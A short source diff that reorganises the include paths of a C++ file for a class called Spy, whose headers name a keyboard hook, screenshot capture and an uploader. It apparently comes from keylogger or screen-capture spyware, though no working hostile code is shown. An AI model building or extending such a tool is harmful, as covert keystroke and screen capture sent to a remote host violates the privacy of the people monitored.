@@ -1,11 +1,10 @@
 #include "spy.h"
-#include "dir.h"
-#include "scrotfile.h"
-#include "kbhook.h"
-#include "screenshot.h"
-#include "task.h"
-#include "uploader.h"
-#include "timer.h"
+#include "stg/dir.h"
+#include "stg/scrotfile.h"
+#include "sys/kbhook.h"
+#include "sys/screenshot.h"
+#include "net/uploader.h"
+#include "sys/timer.h"
 
 HANDLE Spy::mutex = NULL;
 Timer * Spy::scrot_timer = NULL;
